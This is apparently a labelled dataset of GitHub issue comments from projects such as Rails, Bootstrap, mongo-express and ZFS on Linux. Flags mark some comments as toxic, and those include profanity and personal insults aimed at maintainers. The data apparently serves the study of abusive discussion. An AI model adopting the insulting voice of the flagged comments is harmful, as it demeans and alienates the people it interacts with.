rails/rails/1917/1477622,@friend the reason the exception is still there is so that you can override handle_unverified_request and raise it yourself. The reason that the code defaults to resetting the session is that the main class of requests affected by the change were API requests which generally weren't using sessions so it was better than starting to generate errors. Since it was a security flaw there was no choice other than to break backwards compatibility. ,False,True,False,rails/rails/1917
rails/rails/1917/1477733,"@friend I don't really understand the logic here. I think the session is being reset because of the security issue itself (see  and that's fine. But there always was a way to customize the handling of the situation in which the token was invalid, and the way to do it was to use rescue_from as I have shown above and I'm pretty sure a lot of applications already do it this way. So, if you don't want a server error you can customize the method handling the exception and you're all fine. If the exception would be thrown after the session was reset it would be still OK security-wise, it would not break compatibility in this aspect and people would more easily understand why the sudden logging-out occurs. If you absolutely want to introduce a method for handling an invalid token, that's fine, but it should not be done in a bugfix release, should be documented in release notes and in this situation what exactly would be the point of raising this exception from your handle_unverified_request? Sincerly, it looks to me like this was done just to avoid heavier modifications in the Rails test suite. If the exception would be removed, then at least this rescue_from code that is just dead now, would at least cause a runtime error. ",False,True,False,rails/rails/1917
rails/rails/1917/1477876,@friend Have a look at the release notes  It just says it's a security fix and there isn't a word about an upgrade procedure. The only place this was documented is a blog post ,False,True,False,rails/rails/1917
rails/rails/1917/1477989,"To nitpick, what you call ""release notes"" is also a blog post. The links @friend provided also talks a lot more about this. ",False,True,False,rails/rails/1917
rails/rails/1917/1478125,"As mentioned by others this change was deliberate.  We cannot raise exceptions in the unverified request scenario any more because we cannot whitelist API and Ajax requests like we did previously.  Because of this the default handler resets the session which prevents the bulk of the relevant attack vectors. However you do still need to be careful and we're clearly lacking documentation on the things you need to be careful with. @friend While I appreciate your frustration you seem to have missed that the entire reason that the releases were done was to address a serious, exploitable security flaw with the previous method.  We had to change it, and change it in a way that's backwards compatible.  Making the exception be raised by default would reject every single api request, which is clearly unacceptable. Unfortunately you couldn't even work around this using rescue_from because an API without a csrf_token is valid you don't want to abort processing, but for security reasons you still needed to fire the unverified request handler. ",False,True,False,rails/rails/1917
rails/rails/1917/1478192,"@friend Ok, now I finally understand the rationale for this, perhaps parts of what you just said should also be part of documentation, so that it's harder for other people to miss the point as well. ",False,True,False,rails/rails/1917
rails/rails/1917/1478289,"@friend If you wanted to have a go at documenting it, I'd appreciate it.  One of the problems is that as part of addressing the finer points of the flash vulnerability I no longer have any idea what is and isn't confusing to users who didn't spend a month brainstorming the problems and solutions ",False,True,False,rails/rails/1917
rails/rails/1917/1480525,"@friend One thing I still don't understand is why the InvalidAuthenticityToken exception class was and still is kept in the code. If it were removed then people migrating to newer Rails versions would get an error from their rescue_from clause, like it is right now that clause just silently stops working. ",False,True,False,rails/rails/1917
rails/rails/1917/1488067,"The exception is still there because if you don't have an API client you can override the handler method and make it raise that same exception.  This was covered in the release notes. On Fri, Jul 1, 2011 at 322 PM, sztywny reply@friend.github.com wrote --  Cheers Koz ",False,True,False,rails/rails/1917
rails/rails/1917/1488397,"@friend And this is the part that I still think should be changed. Seldom do libraries (frameworks) provide exception classes that the API user ""might be willing to throw"". If Rails itself doesn't raise the exception, it should not be part of Rails. From what I understand there is anyhow no point in raising InvalidAuthenticityToken from handle_unverified_request, then adding a rescue_from and finally doing the actual handling of the invalid token situation in some additional method, because you can do all the handling directly in handle_unverified_request, returning false in case one wants to stop the processing (this should maybe be documented). The same with rendering a 422 or a 500 http code. And removing this exception class prevents old code from failing silently after a migration to a newer version of Rails, which I guess will keep hitting migrating people if it won't be fixed. ",False,True,False,rails/rails/1917
rails/rails/1917/1488531,"@friend there are perfectly valid reasons for throwing the InvalidAuthenticityToken. For example you may be using the [Hoptoad] notification service and want to capture these errors. Now you could call the Hoptoad notifier yourself in  but why not just raise the error and let the built-in handler deal with it. And as @friend points out, if you're upgrading and you have a bunch of code elsewhere handling this then just raising this error is quicker and simpler as an upgrade than having to rewrite and move the code into . ",False,True,False,rails/rails/1917
Skript/SkriptLang/1568/425709698,thats not cool ,True,True,False,Skript/SkriptLang/1568
WarBugs/WarEmu/13182/456842512,"Hey man what's wrong with you? Seriously. A simple no would work fine, you freak. Me and a friend reproduced this bug but forget trying to help you fix anything anymore, loser. ",True,True,False,WarBugs/WarEmu/13182
addons-frontend/mozilla/7881/432603741,"Yeah, so... the whole Mozilla can go fuck itself. ",True,True,False,addons-frontend/mozilla/7881
addons-frontend/mozilla/7757/424530262,smartadblock was abusively rejected by erosman (a simple developer) in a case where the reviewer policy clearly states that more info should be requested. The extension has now been offline for 8hours? how has this guy been allowed to review extensions in the first place? ,True,True,False,addons-frontend/mozilla/7757
editor-layer-index/osmlab/574/433628633,"I feel like you are not even listening to me.  This project doesn't have a version number.  It has a robot that just runs  for people who forget to do it themselves.  The robot introduces conflicts when people actually do run make. It's a ruby script that runs make in a Travis hook to smoosh together JSON files with python.  ELI might just be the hackiest nonsense I've ever seen.  This is not how reliable software is built.  ""Adding more checks"" is missing the point.  Anyone with osmlab rights could just delete all the files.  That we could ""fix it quickly"" is also missing the point.  I'm sure I'd be the person responsible for fixing it quickly. We will never take the autogenerated output on the master development branch of ELI and push it directly into iD.  Never ever.  Stop asking. Let's close this issue, so I can get on with my weekend. ",True,True,False,editor-layer-index/osmlab/574
bootstrap/twbs/19636/144227269,"Bug is in Collapse.prototype.hide. Instead of  var complete = function () {       this.transitioning = 0       this.$element         .removeClass('collapsing')         .addClass('collapse')         .trigger('hidden.bs.collapse')     } Should be  var complete = function () {       this.transitioning = 0       this.$element         .removeClass('collapsing')         .addClass('collapse')dimension         .trigger('hidden.bs.collapse')     } Or 'Collapse' will leave ul with style=""height 0px"", and that's wrong. Issue visible here  on 'Forms' (collapse in) Click on 'Forms' (collapse) Move cursor above 'Forms' and into right side, shown menu (right side) will be transparent when it shouldn't be.  ",,True,False,bootstrap/twbs/19636
bootstrap/twbs/19636/202905590,Thanks for reporting this. Could you provide a reduced test case (JSBin/JSFiddle)? ,,True,False,bootstrap/twbs/19636
bootstrap/twbs/19636/202909411,"do you want also french fries for that ? -- No, Setting dimension (height) to """" works for me. ",True,True,False,bootstrap/twbs/19636
bootstrap/twbs/19636/203036612,"do you want to lose that attitude please? a reduced test case is necessary to see if the problem is indeed one relating to bootstrap itself, or the way in which you've used it (perhaps wrongly, perhaps with errors in some other code/style/js). otherwise i'm afraid we're not going to be able to dissect your specific site to see what's causing the issue. ",,True,False,bootstrap/twbs/19636
bootstrap/twbs/19651/144990690,I've been searching high and low for information on this subject and . bootstrap is already loaded before the view is rendered so the html bindings for bootstraps plugins aren't applied. ,,True,False,bootstrap/twbs/19651
bootstrap/twbs/19651/204084852,"For how-to questions, please use StackOverflow or similar. See ",,True,False,bootstrap/twbs/19651
bootstrap/twbs/19651/205013041,or you could have answered it here you fucking twat ,True,True,False,bootstrap/twbs/19651
bootstrap/twbs/19651/205015111,nice attitude there. certainly makes me want to help you further in future. ,,True,False,bootstrap/twbs/19651
angular-calendar/mattlewis92/493/311889495,If we define multiline event template the next view overlaps with the first ,,True,False,angular-calendar/mattlewis92/493
angular-calendar/mattlewis92/493/379213708,Please follow the issue template and attach a clear plunker etc that clearly reproduces the issue you're facing. Thanks! 😄 ,,True,False,angular-calendar/mattlewis92/493
angular-calendar/mattlewis92/493/379219477,"the problem is that you are fixing event height in week view, if we have multiline event template it bugs ",,True,False,angular-calendar/mattlewis92/493
angular-calendar/mattlewis92/493/379227878,"The default demo auto truncates long event titles to handle this, if you've used a custom template I have no way of knowing what your issue is because you've written some custom code that I cannot see, hence why I asked for the plunker. &lt;img width=""268"" alt=""screen shot 2018-04-06 at 13 27 53"" src="" bear in mind that I work on this project in my spare time for free. If your company is paying you to use other peoples free software, then you should spare a few minutes of your time to follow the guidelines when reporting issues on other peoples free software. I get dozens of issues opened across my projects, and I can only spare the time to answer those that provide specific reproductions of issues. If this isn't acceptable to you, then you are more than welcome to build your own calendar component that functions exactly how you would like it to. If it's all the same to you, I would not like to engage with you further as this is a waste of energy on both sides. Best of luck with completing your project!  😄 ",,True,False,angular-calendar/mattlewis92/493
bootstrap/twbs/13476/32615992,Can someone give me an idea how to make this work? ,,True,False,bootstrap/twbs/13476
bootstrap/twbs/13476/41935058,"The tabs plugin relies on the DOM having a certain structure. Specifically, it relies on the tab labels being s within a , among other things. Read  and consult the examples in our docs. ",,True,False,bootstrap/twbs/13476
bootstrap/twbs/13476/41935591,Hi @friend thank you for your ever useless explanations. ,True,True,False,bootstrap/twbs/13476
bootstrap/twbs/13476/41938622,"@friend No need for the snarky attitude. @friend clearly explained to you that our tabs plugin requires a specific structure in your markup. You're using the tab-able classes here, so logically it makes sense to focus on the fact that this just won't work if that's your intent. Moreover, you shared a single link with no context and asked us how to make it work. Sadly, we can't help folks with this kind of stuff here. We have to focus on bug reports and feature requests, otherwise we get super bogged down and are of no use to anyone. Lastly, if you have specific questions on how to do something, you'll likely want and need to consult a forum like Stack Overflow. We currently don't have an official mailing list or forum. ",,True,False,bootstrap/twbs/13476
bootstrap/twbs/13476/41981045,@friend Thank you for your reply. I got the ID's wrong in the example. I couldn't locate them myself I was too in the code to notice that anything was wrong. Issue is now CLOSED. @friend I suggest revoking the ability to close an issue for @friend. IMHO the person is doing more harm than good to Bootstrap's GitHub repository. ,,True,False,bootstrap/twbs/13476
bootstrap/twbs/13476/41985279,"I get what you're saying when you declare an issue closed, but just to be clear here, this was closed before you deemed it closed. I'm not trying to be arrogant here, so please do not take it that way. This is not a bug report and it's not a feature request, and as I clearly stated earlier, we cannot help you with these kind of problems here. @friend Well, good thing that's not up to you. Chris is an exceptional contributor and Bootstrap wouldn't be where it's at today in any sense of the matter without him. He's done way way way more for this project than you could possibly imagine. Moreover, I took a brief look back and as far as I can tell, comments from @friend towards you have been direct and free of demeaning or aggressive overtones. He's also clearly explained as much as he can given his position as a contributor. At one point he expressed frustration, but I cannot say I fault him for that given the context. It would appear you felt most upset about #13133 where both @friend and @friend commented about what simply amounts to a can't fix problem. Per the comments in that issue, there is no jQuery event to cue off when an element is removed from the dom, so there's nothing to tell Bootstrap when that happens. I don't know if that's 100% the case as I'm not the JS expert here, but given @friend's track record with us, I'm inclined to believe both him and Chris. A solution was clearly provided after the constraints were clearly stated. I fail to see how you believe that issue has not been properly addressed as well. Take a step back and revisit this later. Consider that we're all human, we also have full-time jobs of our own, we maintain a very large and complex open source project, and we're all trying to do our best here. There's no malcontent intended in any of these interactions. &lt;3 ",,True,False,bootstrap/twbs/13476
bootstrap/twbs/1009/2844907,"I've now had two pull requests closed now for lack of PAYING F*CKING ATTENTION. Most recently  the past  I'm trying to help you guys here. @friend , get some new glasses. ",,True,False,bootstrap/twbs/1009
bootstrap/twbs/1009/3497687,"Perhaps you should specify your pull requests against the  branch rather than an arbitrary commit SHA (e.g., #989). Also, this is not an issue. Discuss on the mailing list or something... ",,True,False,bootstrap/twbs/1009
bootstrap/twbs/1009/3497690,Shrug. Perhaps @friend  should actually bother looking at the f*cking diff. They were all small changes. ,True,True,False,bootstrap/twbs/1009
bootstrap/twbs/1009/3497701,"Well, by ""PAYING F*CKING ATTENTION"" you could have specified your pull requests against the branch and allowed for a one-click merge on the website. Close this ""issue"" already and let them get back to real work... ",True,True,False,bootstrap/twbs/1009
bootstrap/twbs/1009/3498030,@friend  maybe when you pull request is in wrong branch    this one is correct branch    D ,,True,False,bootstrap/twbs/1009
bootstrap/twbs/1009/3500732,"@friend sorry about that - we're human, we all make mistakes. Your first request was in fact pulled a while ago, and I would pull your most recent but it can't be reopened so I'll make the changes manually. ",,True,False,bootstrap/twbs/1009
bootstrap/twbs/1009/3500959,"@friend There is no reason to get upset about any of this. I'm sorry I mistakenly thought your pull requests were against master instead of 2.0-wip. As @friend suggested, in the future I ask that you submit pull requests to branches and not a sha so I can more easily tell where they should be applied. That way I can auto-merge them right here on GitHub with full context. I scanned the top line and didn't see 2.0-wip, so I made the most of the changes manually and closed it out. I'll watch out for that in the future. That said, insults, cursing, and bashing me won't help you at all. I'm happy that you're using and contributing to Bootstrap, but I won't actively help folks with that kind of attitude. We do this in our spare time to help the community and stuff like this actively works against that. If you want to help us, please continue to do so with a positive attitude. If you can't, don't bother—no skin off my back. ",,True,False,bootstrap/twbs/1009
bootstrap/twbs/1009/3504348,"@friend First off, let me apologize. I went quite a bit overboard. Now that I know the proper way to submit pull requests, I will do so going forward. I'm newish to git[hub] and didn't realize that my diff's appeared to be on the wrong branch. That said, I've been contributing to open source for 15+ years now and I've never seen someone disregard a diff without even looking at it first. Not only once, but multiple times. In the least, you could have looked at it and then said hey, this is great, but I need you to submit it in this other way. I know that this is volunteer work on your part, but it is also on mine. I'm trying to start out with just some basic changes (helping with docs) and I spent whatever amount of time working on that diff. To have it just quickly thrown out, with no recourse or reason really pissed me off. In my defense, I think that is what pushed me over the edge. Again, I apologize. I'll keep a better attitude going forward. Thanks for your hard work. I'm really enjoying working with this code. ",,True,False,bootstrap/twbs/1009
mongo-express/mongo-express/411/320711616,Please upgrade to 3.0 Driver To support MongoDB 3.6 ,,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/387578196,"If you  does it work as intended? If so, can you submit a PR? ",,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388476604,"Got an error when try to run in docker Please help, I'm not familiar with JavaScript. ",,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388505703,"As the package  has gone through a major version change from 2.2.24 to 3.0.8, where things are expected to break, there will probably be some things that break. Please don't say things like ""So it should be easy and smooth upgrade."" if you don't understand what's involved in an upgrade 😉 I'd suggest looking at the changelog for , which specifically outlines how `Db.prototype.open♠ has been removed, and how to address that. ",,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388549076,"@friend I say ""So it should be easy and smooth upgrade."" for one thing - that there support for previous version of mongodb will be available after upgrading, according to the matrix compatibility. So you should no need to create workaround to support version that you currently support. The second thing, I have request help from side of developers of mongo express because I'm not familiar with JavaScript - I'm a Java developer. If I was a JavaScript developer I help you with upgrade, but now I'm requesting help from project developers side and community. ",,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388615956,"@friend, as it is so ""easy and smooth"", maybe you could submit a PR? Or maybe you should not say it is ""easy and smooth"" if you do not know what you are talking about? ",,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388618253,"@friend I think for time spended on this discussion about writing someone what he should and what he should not, the JavaScript developer can spend time to something useful in order to submit fix with upgrading to the new version and get many big thanks from the community for pushing this upgrade to the upstream so fast. ",,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388622441,"Ah... A typical п'явка - you want to tell me what to do with my time, but are not smart enough to fix the problem yourself? Surely you could try, you don't have the looks to be this stupid. ",True,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388622951,"@friend You're being combative and unhelpful here. This is not how we do an open source community. @friend Wulf is right in one regard, in that doing a major version upgrade of arguably the most integral library is probably not something someone new to JS, or even the project, should probably attempt. (Particularly for a library like mongodb that doesn't do major version upgrades all that often.) Even if the code changes are minimal, it would still require at some amount of regression testing to make sure nothing broke in the transition. It's probably not a huge untertaking, but not one to be taken lightly either. Unfortunately, this project is essentially a side project for the maintainers. We try to fix bugs and merge PRs when we can, but none of us have too much time to spend directly on this. ",,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388624055,"Thank you @friend, appreciated. @friend,  ""easy and smooth"" are not words you should use especially when this clearly isn't either easy nor smooth. The major version upgrade of the core library used by this project is a huge task. By saying ""easy and smooth"", you are undermining the value of our efforts. We have donated our time to make this - nobody here is paid, nobody here has a shortage of things to do. We have given you this software, do you give back or do you tell us it is bad and cheap? It makes me sick to feel that our efforts are expected for free, or worse, because we give them for free our efforts are also valueless. Do you work for free? I have to work to earn money to buy fuel and food like everyone else - that you tell me to do something, and to do work for you rather than point out the difficulty of the task, does not make me want to do anything. Do not tell people what to do with their time, if you are asking someone to help you. If you would like a difficult feature done quickly, maybe you could post an incentive at BountySource for someone else to help. ",,True,False,mongo-express/mongo-express/411
mongo-express/mongo-express/411/388947437,"Cleaned up a bit of the conversation to keep it on topic. There is an open issue, lets focus on it ) ",,True,False,mongo-express/mongo-express/411
dialogflow-nodejs-client-v2/dialogflow/63/316229840,"Thanks for stopping by to let us know something could be better! MAC Osx High Sierra Node v9.11.1 npm 5.6.1 dialog flow 0.3.0 const sessionClient = new dialogflow.SessionsClient();     const sessionPath = sessionClient.sessionPath(projectId, sessionId);     const request = {         session sessionPath,         queryInput {             text {                 text text,                 languageCode lang,             },         },     };     try {         let responses = await sessionClient.detectIntent(request);     } catch (err) {         return console.error('ERROR', err);     } Error 7 PERMISSION_DENIED Dialogflow API has not been used in project usable-auth-library before or it is disabled. Enable it ",False,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/383069663,@friend Have yo enabled it? GO to your GCP console and enable this api before trying. ,,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/383070478,@friend yes it is already enabled. ,,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/384157062,@friend Have you solved it? I am getting the same error. I did every thing as stated in  was stuck with this error Then I resolved it with Now i am getting ♠Error 7 PERMISSION_DENIED Dialogflow API has not been used in project usable-auth-library before or it is disabled. Enable it` ,,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/384157266,@friend  I havent solved it. I started using REST API v1 from dialogflow. ,,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/384184421,@friend But they made V2 as default and any new update will be only to v2... I will try to find out. If i could will let you. If you found also let me know ,,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/386143069,@friend I was having a similar error; to resolve you have to go into  and check the IAM user permissions on the user account for your compute instance. (it may be something like &lt;projectid&gt;@friend...) Make sure that user has all three permissions for DialogFlow ,,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/386164496,"Judging by the error you are getting, credentials are not set up correctly in your environment. Please follow   (if you send queries from command line)  (if you are using client libraries)  ",,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/386504546,"Solution of @friend solved my problem. I use IDEA in Ubuntu, in terminal window type in♠export GOOGLE_APPLICATION_CREDENTIALS=""/home/user/Downloads/service-account-file.json""` ",,True,False,dialogflow-nodejs-client-v2/dialogflow/63
dialogflow-nodejs-client-v2/dialogflow/63/387459078,Using Node.js. Exporting the GOOGLE_APPLICATION_CREDENTIALS env var as written by @friend solved my problem. I think it should be in written in the documentation. ,,True,False,dialogflow-nodejs-client-v2/dialogflow/63
zfs/zfsonlinux/8213/392150854,    System information  Type | Version/Name  --- | ---  Distribution Name   | all Distribution Version    | all Linux Kernel    | all Architecture    | all ZFS Version | all SPL Version | all   Describe the problem you're observing Include any warning/errors/backtraces from the system logs ,,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/448225576,"also, from  compression=lz4 on your pools' root datasets so that all datasets inherit it unless you have a reason not to enable it"" is there a strong reason to not enable it by default? ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/448310941,"Defaults should be sane and consistent from a user standpoint.   is most consistent with other filesystems, produces expected results with regard to applications like  and , and users' initial expectations of space usage will be met. ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/448675022,"Perhaps we can handle this a different way. Create a user editable configuration file that would be used for defaults. ZFS on Linux seems to have one already, (at least on Gentoo Linux); ZFS_MOUNT='yes' which would be applied on any pool creation. Then inherited down the dataset / zvol tree. However, I do agree leaving the current default of compression off is best for now. And this idea can be discussed elsewhere, (like the mailing list). ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/448968434,"that idea would be awesome and would solve another issue, the default mountpoint on root filesystem tree instead of naturally going into /srv on linux ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/448970331,"@friend I can't easily search for ""defaults"" as there are too many results, do you happen to know if is there already filed some issue to provide defaults in a /etc/default/zfs file (in the upstream package, not added by distro)? this and the other issue I mentioned should then be solved. ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/449129865,"@friend, no I don't know if this defaults file concept has been filed as a feature request / issue. It should probably be followed up in the mailing lists. And / or reported as a separate issue. As for your default mountpoint for a pool, I thought it was based on the pool name. Thus, a pool named ""srv"" would mount by default on ""/srv"". I routinely disable my pool's automounting, as it's never correct. So; ♠zpool create -O mountpoint=legacy POOL DEVICE` ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/449388613,Other candidates for updated defaults could be  and  as these two seem to be a 'you definitively want this' in most of the howtos for pool creation that float around. Thus a generic way to specify -o and -O options in a default file that are applied on  would be helpful. Ceterum censeo regarding the argument about consistency with other filesystems and users initial expectations we should do something about  being a red herring. ,,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/449393390,"Objection, that implies  which not everybody wants. ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/449401085,"Can we repurpose this issue as a feature request for a global zfs/zpool preferences file? Like the one ubuntu already provides, but with added abilites (1) to specify zpool create -o -O flags and (2) with ability to tell the root prefix mountpoint (instead of default /) ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/449402529,"there is some precedent for defaults already, where the ""default config file"" is /etc/modprobe.d/zfs.conf see ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/449471254,"Thinking about this more, it maybe should be 2 / 3 configuration files. Or a way to specify the difference between options for zpool, zfs and Zvols. Meaning the current requests could be met with; compression=""lz4"" And in some cases, I can see Zvols wanting this as the default; volblocksize=8k$ZVOL$TIMEzpool import`...) ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/449698840,It would be great if we can set any default value via some config file (if we're already speaking about this functionality for compression). What do you think about it? ,,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/449939967,"ZFS is slowly becoming ""the systemd"" of filesystems and it is because of feature requests like this (and #6836, #6041, #4134) Is it too hard to type ""-O compression=lz4"" once in a blue moon? No, it is not. Does your job require typing ""zpool create"" all day long? You can script it with something that fits your needs. Once again we see a great product of engineering being pushed around by the some members of its community. I can't wait to see ZFS/systemd integration via D-Bus /s. ",True,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/450009550,yes ,,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/450178388,"IMNSHO, pool creation should be automated, like everything else you do more than once. When developing such automation, understanding where and why someone else changes the defaults is toil. ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/450985164,"For me compression is a feature, and as such should be leaved off by default even if the recommended setup is to have it on. As said before, compressing data by default is not so common among filesystems and certainly unexpected. Sane defaults often are not the same than recommended setup for a use-case, as generic as it could be. I'd also arg that ZoL would then diverge from the other zfs implementations, which -as far as I know- retain mostly the same settings. As for the default setting file, only root can create/mount filesystems, so why not put a cmd alias somewhere in ? ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/451675439,"if we keep talking about ancient expectations from ext2 days, we will never progress. please stop comparing ZFS to other filesystems that do not even have checksum - should we disable checksum by default to not ""confuse"" new users? setting compression off at creation is just as trivial as setting it on was, before this change would be implemented. you are all acting like the sky is falling. do you know what's even worse? a customer setting up a system with several dozen TB and compression=off because they didn't know it would be a good idea to have compressed metadata, ARC, or, that lz4 compression is the default and it bails out early instead of wasting cycles trying to compress random data. and then we tell them ""turn compression on always"" and they ask ""why is not the default?"" and now they get to reshuffle an absurd amount of data around. ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/468168052,@friend can this be brought up in the next meeting? ,,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/468323462,"@friend Sure, can you also bring it up on the developer@friend.org mailing list so that folks from all platforms have a chance to weigh in on this before the meeting? ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/468402927,"Let's have this issue be specific to the having compression on out-of-the-box, with no additional work.  It sounds like some folks would also like to be able to have a settings file that (essentially) provides some default arguments whenever you run ""zpool create"".  If that's still desired, please open a separate Issue (feature request) for that. ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/468405585,"for the other aspect, using a zedlet is the best way I've found to automatically modify pool/dataset properties at creation time. ",,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/485986381,seems like all of the negative aspects of having  by default (CPU wasting cycles) could be avoided if we also port this  along with switching the default to ,,True,False,zfs/zfsonlinux/8213
zfs/zfsonlinux/8213/486006830,"This was discussed at today's OpenZFS Leadership Meeting.  Here are the relevant notes The idea is to give a better out of the box experience. The downsides are potential CPU cost (and write performance due to compressing) and new users misunderstanding how the space is used in certain cases. Igor There have been issues when root pools are expecting compression to be disabled (on SPARC?) Allan This has been the default in FreeBSD installer for ~2 years Sef Boot pools need to be different for each platform, but grub doesn’t seem like it needs to be different. Sef supports it being the default. Compression=on has been the default in FreeNAS for several years; no complaints *** Someone to take an action item to investigate benefits and issues, and write it up? ",,True,False,zfs/zfsonlinux/8213
openusercss.org/OpenUserCSS/121/334725955,  Expected behaviour Actual behaviour     Save Theme Stay in edit page and an error on editor    Steps to Reproduce the Problem    Copy and paste my usercss github-xp Click Save Theme The error shown as following and can't save    Environment details   &lt;details&gt;   &lt;summary&gt;&lt;strong&gt;Stack trace&lt;/strong&gt; (click to expand)&lt;/summary&gt;   &lt;/details&gt;,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399311880,Safe to ignore that. CSS  is scheduled at some point in CSS4 and was backed out of CSS3. The  prefix means that it's Mozilla specific. See also ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399312476,@friend oh.. OK But I can't save theme still. 😓 ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399312744,Well I'll give it a shot on my account temporarily... I'm new to the site as well. Good as any test to start. ) Please hold. ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399314348,"Hmmm I get a red popup that says something like Will probably have to wait for someone higher up to assist you as I can't upload your CSS successfully myself. However I did dump most of the script in between and it successfully did upload... so that to me would normally indicate you may have an error in the CSS somewhere... perhaps a mismatched curly brace, missing comma, missing semi-colon, or something else? ",,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399315685,I think  is a variable... did you set it? ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399316078,@friend variable? It's a name of keyframes. ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399317369,"Well just guessing (variables are my least known in CSS and I'm still getting used to the site )... after that ""Clippy"" block is where it refuses to let me upload it. ",,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399317678,Should the line at  be  instead of ? ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399317953,Ref    (some note about CSS2 vs CSS3)... perhaps some validation is occurring that requires CSS3? (taking another stab guess)  ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399320062,Okay... so knocking out  and  allows almost 100% to upload... won't make any more conclusions as this is a weird issue... but I would start looking at those data URI PNG's to see if there's an issue. ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399321866,"@friend Yes, you're right. I replace Data URL to imgur and it works! ",,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399322476,I'm hoping this isn't a ReDoS issue in one of the packages that OUCSS utilizes but it seems like it or an overload of the CPU parsing. Glad you found a work-around for the moment. ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399921168,Theme size is key in OUCSS the data URI just add size and OUCSS doesnt take larger themes at all. ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399924008,A better error response stating any limits reached would be much more helpful. Stabbing at a bug without knowing what tool to use is lengthy. All in time I suppose... the site is still Beta and we all must be patient. ) ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399926308,"The site maybe beta and half the bugs aren't even reported or the developer doesn't see some bugs because of lack of testing in other OS's and browser configs. But nothing is ever bug free in my experience, so beta/alpha/stable to me just mean, alpha = expect loads of bugs/breakages, beta= expect some bugs and maybe the odd breakage, stable=expect the same as beta ) ",,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399926820,Hop to it! ;) Hop faster! ;) ,,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/399960166,"You do realize who you are talking to right?????????    I'm ........... the BATMAN! ;) Anyhow you are seriously going off-topic, and dragging me and everyone along with it. Rather than complain about something continue doing something about it e.g continue to test and report like a good clown instead of being passive-aggressive towards the owner. Ciao for now since I have sites to maintain myself, assisted a little with this issue since it peaked my interest, and have fun with your ""pen"". ;) ",,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/400042884,"@friend I want going to reply, bevause I hate dropping to any level of low, but your level of [douchebaggery descrip#3]) has led me to ignore you completely because the level of douche hypocrisy in your reply exceed insanity plus one. ",True,True,False,openusercss.org/OpenUserCSS/121
openusercss.org/OpenUserCSS/121/400088095,"Thanks for the report! This error in the editor is safe to ignore, since it's unable to understand -moz-document rules (for now). It should still report warnings like usual. Please take care in the future to respect others' views, I don't want to lock threads and limit sharing ideas in the comments (yes, even the deleted ones). We're on GH to see new and interesting things, not to berate each other and mount our views on top of the site's morale. ",,True,False,openusercss.org/OpenUserCSS/121
